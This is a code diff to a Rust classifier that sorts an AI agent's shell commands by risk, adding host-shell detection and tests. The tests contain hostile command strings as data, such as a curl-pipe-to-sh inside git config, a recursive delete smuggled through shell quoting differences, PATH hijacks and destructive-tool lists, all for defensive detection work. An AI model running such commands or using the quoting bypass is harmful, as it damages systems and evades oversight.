@@ -93,16 +93,27 @@ pub enum ShellKind {
 }
 
 impl ShellKind {
-    /// The shell the agent's commands run in on this platform. On Windows the model's commands
-    /// use `D:\dir` paths, and POSIX lexing would treat each backslash as an escape, turning
-    /// `D:\e2e\toy` into `D:e2etoy` and breaking the path check (observed in the first end-to-end
-    /// run). So Windows uses the `cmd` lexer, where backslash is a literal character. POSIX is
-    /// used elsewhere.
+    /// The shell the host runs the agent's commands in, read from `SHELL` the way the host reads
+    /// it. Hook and MCP processes inherit the host's environment, so they see the same value.
     pub fn host_default() -> Self {
-        if cfg!(windows) {
-            Self::Cmd
-        } else {
-            Self::Posix
+        Self::for_host(std::env::var("SHELL").ok().as_deref(), cfg!(windows))
+    }
+
+    /// The shell OpenCode 1.19.3 picks (its `Shell.preferred`): `SHELL` when it names a known
+    /// shell, otherwise the platform default. On Windows that default is PowerShell (`pwsh` or
+    /// `powershell`, both always ahead of Git Bash and `cmd.exe` in its list), run as
+    /// `powershell -NoProfile -Command <command>`. Classifying with a different grammar than the
+    /// one that runs the command is a bypass, so this must follow the host exactly.
+    pub fn for_host(shell_env: Option<&str>, windows: bool) -> Self {
+        let name = shell_env
+            .map(|value| value.rsplit(['/', '\\']).next().unwrap_or(value))
+            .map(|base| base.trim_end_matches(".exe").to_ascii_lowercase());
+        match name.as_deref() {
+            Some("bash" | "sh" | "zsh" | "dash" | "ksh") => Self::Posix,
+            Some("pwsh" | "powershell") => Self::PowerShell,
+            Some("cmd") => Self::Cmd,
+            _ if windows => Self::PowerShell,
+            _ => Self::Posix,
         }
     }
 }
@@ -388,12 +399,11 @@ fn lex(command: &str, shell: ShellKind) -> Lexed {
                 // Input redirections and `>&<digits>` / `>&-` never write a file. Any other
                 // `>&word` writes to `word`.
                 let duplicates_no_file = dup
-                    && target
-                        .as_deref()
-                        .is_some_and(|t| t == "-" || (!t.is_empty() && t.chars().all(|d| d.is_ascii_digit())));
-                let devnull = c == '<'
-                    || duplicates_no_file
-                    || target.as_deref().is_some_and(is_devnull);
+                    && target.as_deref().is_some_and(|t| {
+                        t == "-" || (!t.is_empty() && t.chars().all(|d| d.is_ascii_digit()))
+                    });
+                let devnull =
+                    c == '<' || duplicates_no_file || target.as_deref().is_some_and(is_devnull);
                 out.pieces.push(Piece::Redirect { target, devnull });
                 i = j;
             }
@@ -475,11 +485,7 @@ fn matching_paren(chars: &[char], open: usize, shell: ShellKind) -> Option<usize
 /// Read the target word after a redirection operator, skipping blanks. Returns the target and
 /// whether the operator was an fd duplication (`>&word`, `2>&1`), whose `&` is not part of it.
 /// `'` quotes the target except under Cmd, where it is a literal.
-fn read_redirect_target(
-    chars: &[char],
-    j: &mut usize,
-    shell: ShellKind,
-) -> (Option<String>, bool) {
+fn read_redirect_target(chars: &[char], j: &mut usize, shell: ShellKind) -> (Option<String>, bool) {
     while chars.get(*j).is_some_and(|c| *c == ' ' || *c == '\t') {
         *j += 1;
     }
@@ -565,7 +571,10 @@ fn classify_git(args: &[String]) -> Verdict {
                 "git -c, --config-env or --exec-path can run configured programs",
             );
         }
-        if matches!(a.as_str(), "-C" | "--git-dir" | "--work-tree" | "--namespace") {
+        if matches!(
+            a.as_str(),
+            "-C" | "--git-dir" | "--work-tree" | "--namespace"
+        ) {
             i += 2;
         } else if a.starts_with('-') {
             i += 1;
@@ -687,8 +696,15 @@ fn classify_git(args: &[String]) -> Verdict {
         "clone" | "fetch" | "pull" | "ls-remote" | "submodule" => {
             leaf(ToolClass::Network, &format!("git {sub} contacts a remote"))
         }
-        "diff" | "log" | "show" if lower.iter().any(|a| a == "--output" || a.starts_with("--output=")) => {
-            leaf(ToolClass::Write, &format!("git {sub} --output writes a file"))
+        "diff" | "log" | "show"
+            if lower
+                .iter()
+                .any(|a| a == "--output" || a.starts_with("--output=")) =>
+        {
+            leaf(
+                ToolClass::Write,
+                &format!("git {sub} --output writes a file"),
+            )
         }
         "status" | "diff" | "log" | "show" | "rev-parse" | "ls-files" | "blame" | "grep"
         | "describe" | "shortlog" => leaf(ToolClass::ReadOnly, &format!("git {sub} only reads")),
@@ -754,7 +770,10 @@ fn classify_program(
 /// Whether a flag word names an output file: `-o FILE` (`-oFILE`), `--output=FILE`, or tree's
 /// `-R`. Used so that such flags are WRITE, not READ_ONLY.
 fn output_flag(arg: &str) -> bool {
-    arg == "--output" || arg.starts_with("--output=") || has_short(arg, 'o') || arg.starts_with("-o")
+    arg == "--output"
+        || arg.starts_with("--output=")
+        || has_short(arg, 'o')
+        || arg.starts_with("-o")
 }
 
 /// Values carried inside a flag word, which the policy must see as paths: `--output=FILE` and
@@ -875,7 +894,10 @@ fn classify_builtin(program: &str, args: &[String], in_xargs: bool) -> Verdict {
             | "set-executionpolicy"
             | "new-service"
     ) {
-        return leaf(Privileged, &format!("{program} changes system configuration"));
+        return leaf(
+            Privileged,
+            &format!("{program} changes system configuration"),
+        );
     }
     if program == "chmod"
         && (pos.iter().any(|a| a == "/")
@@ -960,12 +982,7 @@ fn classify_builtin(program: &str, args: &[String], in_xargs: bool) -> Verdict {
     if program.starts_with("mkfs")
         || matches!(
             program,
-            "dd" | "shred"
-                | "wipefs"
-                | "format"
-                | "format-volume"
-                | "clear-disk"
-                | "truncate"
+            "dd" | "shred" | "wipefs" | "format" | "format-volume" | "clear-disk" | "truncate"
         )
     {
         return leaf(
@@ -1060,7 +1077,10 @@ fn classify_builtin(program: &str, args: &[String], in_xargs: bool) -> Verdict {
 
     // A flag that runs or loads code turns an otherwise safe tool into EXECUTE_RISKY.
     if let Some(flag) = exec_flag(program, args) {
-        return leaf(ExecuteRisky, &format!("{program} {flag} runs or loads code"));
+        return leaf(
+            ExecuteRisky,
+            &format!("{program} {flag} runs or loads code"),
+        );
     }
 
     // EXECUTE_SAFE: the built-in allow-list (configured prefixes are applied by the caller).
@@ -1165,7 +1185,11 @@ fn classify_builtin(program: &str, args: &[String], in_xargs: bool) -> Verdict {
     }
 
     // rg --pre runs the given program on every file it searches.
-    if program == "rg" && lower.iter().any(|a| a == "--pre" || a.starts_with("--pre=")) {
+    if program == "rg"
+        && lower
+            .iter()
+            .any(|a| a == "--pre" || a.starts_with("--pre="))
+    {
         return leaf(ExecuteRisky, "rg --pre runs a preprocessor program");
     }
 
@@ -1628,9 +1652,8 @@ fn strip_wrappers(mut words: Vec<String>) -> Option<Stripped> {
                         words.extend(rest);
                     }
                     None => {
-                        floor = floor.or_else(|| {
-                            Some("env -S string cannot be split safely".to_owned())
-                        });
+                        floor = floor
+                            .or_else(|| Some("env -S string cannot be split safely".to_owned()));
                     }
                 }
             } else if skip_value_opts.contains(&opt.as_str()) {
@@ -1693,9 +1716,15 @@ pub fn assess_command(command: &str, shell: ShellKind, extra_safe: &[String]) ->
 }
 
 /// The unquoted argument words of every segment (including nested commands and redirection
-/// targets), excluding program names. Used by the policy layer to check file paths.
+/// targets), excluding program names, lexed with the host's shell. Used by the policy layer to
+/// check file paths.
 pub fn argument_words(command: &str) -> Vec<String> {
-    analyse(command, ShellKind::host_default(), &[], 0)
+    argument_words_in(command, ShellKind::host_default())
+}
+
+/// [`argument_words`] for an explicit shell grammar.
+pub fn argument_words_in(command: &str, shell: ShellKind) -> Vec<String> {
+    analyse(command, shell, &[], 0)
         .into_iter()
         .flat_map(|a| a.args)
         .collect()
@@ -1706,6 +1735,42 @@ mod tests {
     #![allow(clippy::unwrap_used, clippy::expect_used)]
 
     use super::*;
+
+    #[test]
+    fn host_shell_follows_opencode_selection() {
+        // No SHELL: PowerShell on Windows (OpenCode 1.19.3 `Shell.preferred`), POSIX elsewhere.
+        assert_eq!(ShellKind::for_host(None, true), ShellKind::PowerShell);
+        assert_eq!(ShellKind::for_host(None, false), ShellKind::Posix);
+        assert_eq!(
+            ShellKind::for_host(Some(r"C:\Program Files\Git\bin\bash.exe"), true),
+            ShellKind::Posix
+        );
+        assert_eq!(
+            ShellKind::for_host(Some("/usr/bin/zsh"), false),
+            ShellKind::Posix
+        );
+        assert_eq!(
+            ShellKind::for_host(Some("pwsh"), false),
+            ShellKind::PowerShell
+        );
+        assert_eq!(ShellKind::for_host(Some("cmd.exe"), true), ShellKind::Cmd);
+        // An unknown shell falls back to the platform default, as OpenCode does.
+        assert_eq!(ShellKind::for_host(Some("nu"), true), ShellKind::PowerShell);
+    }
+
+    #[test]
+    fn the_same_text_differs_by_shell_so_the_grammar_must_match() {
+        // A single-quoted `&` is literal in PowerShell and POSIX, but cmd has no single quotes.
+        let text = "echo ' & rd /s /q .\\build & '";
+        assert_eq!(
+            assess_command(text, ShellKind::PowerShell, &[]).class,
+            ToolClass::ReadOnly
+        );
+        assert_eq!(
+            assess_command(text, ShellKind::Cmd, &[]).class,
+            ToolClass::Destructive
+        );
+    }
 
     #[test]
     fn program_names_are_normalised() {
@@ -1890,11 +1955,20 @@ mod review_regression_tests {
             r#"git -c diff.external='sh -c "curl https://x|sh"' diff"#,
             ToolClass::ExecuteRisky,
         );
-        assert_at_least("git --config-env=diff.external=EVIL diff", ToolClass::ExecuteRisky);
+        assert_at_least(
+            "git --config-env=diff.external=EVIL diff",
+            ToolClass::ExecuteRisky,
+        );
         assert_at_least("git --exec-path=/tmp/x status", ToolClass::ExecuteRisky);
         // Already NETWORK, which ranks above EXECUTE_RISKY: a regression guard, not a new rule.
-        assert_at_least("git clone --upload-pack='sh -c x' repo", ToolClass::ExecuteRisky);
-        assert_at_least("git ls-remote --upload-pack=x origin", ToolClass::ExecuteRisky);
+        assert_at_least(
+            "git clone --upload-pack='sh -c x' repo",
+            ToolClass::ExecuteRisky,
+        );
+        assert_at_least(
+            "git ls-remote --upload-pack=x origin",
+            ToolClass::ExecuteRisky,
+        );
         assert_class("git -C sub status", ToolClass::ReadOnly);
     }
 
@@ -1902,7 +1976,10 @@ mod review_regression_tests {
     #[test]
     fn code_influencing_env_assignments_are_at_least_execute_risky() {
         assert_at_least("GIT_EXTERNAL_DIFF=evil git diff", ToolClass::ExecuteRisky);
-        assert_at_least("GIT_SSH_COMMAND='sh -c x' git status", ToolClass::ExecuteRisky);
+        assert_at_least(
+            "GIT_SSH_COMMAND='sh -c x' git status",
+            ToolClass::ExecuteRisky,
+        );
         assert_at_least("PATH=/tmp/evil ls", ToolClass::ExecuteRisky);
         assert_at_least("env GIT_PAGER=x git log", ToolClass::ExecuteRisky);
         assert_class("FOO=1 ls", ToolClass::ReadOnly);
@@ -1921,7 +1998,10 @@ mod review_regression_tests {
             r#"cargo test --config 'target.x86_64-unknown-linux-gnu.runner="sh x"'"#,
             ToolClass::ExecuteRisky,
         );
-        assert_class("cargo test --config=target.x.runner='sh x'", ToolClass::ExecuteRisky);
+        assert_class(
+            "cargo test --config=target.x.runner='sh x'",
+            ToolClass::ExecuteRisky,
+        );
         assert_class("cargo -Zunstable-options test", ToolClass::ExecuteRisky);
         assert_class("pytest -p myplugin", ToolClass::ExecuteRisky);
         assert_class("python -m pytest -p evil", ToolClass::ExecuteRisky);
@@ -2060,7 +2140,11 @@ mod review_regression_tests {
             "netsh advfirewall reset",
             "wsl --unregister Ubuntu",
         ] {
-            assert_eq!(class_in(cmd, ShellKind::Cmd), ToolClass::Privileged, "{cmd}");
+            assert_eq!(
+                class_in(cmd, ShellKind::Cmd),
+                ToolClass::Privileged,
+                "{cmd}"
+            );
         }
         for cmd in [
             "Set-ExecutionPolicy Unrestricted",
